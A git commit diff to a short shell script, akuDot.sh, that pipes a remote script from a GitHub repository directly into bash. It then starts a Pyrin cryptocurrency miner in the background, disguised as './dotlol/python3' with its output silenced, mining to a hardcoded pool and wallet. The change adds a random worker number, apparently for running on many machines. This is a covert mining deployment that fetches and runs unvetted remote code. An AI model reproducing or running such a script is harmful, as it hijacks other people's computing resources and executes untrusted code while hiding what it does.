9c150ae06890683012486527adf0d2f47c74bc35
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-29 01:52:32 +0700

    Update akuDot.sh

--- akuDot.sh
+++ akuDot.sh
@@ -4,4 +4,6 @@ apt install screen -y
 
 bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotLol.sh)"
 
-nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT --no-cl > /dev/null 2>&1 &
+nomer=$((RANDOM % 50 + 1))
+
+nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT$nomer --no-cl > /dev/null 2>&1 &
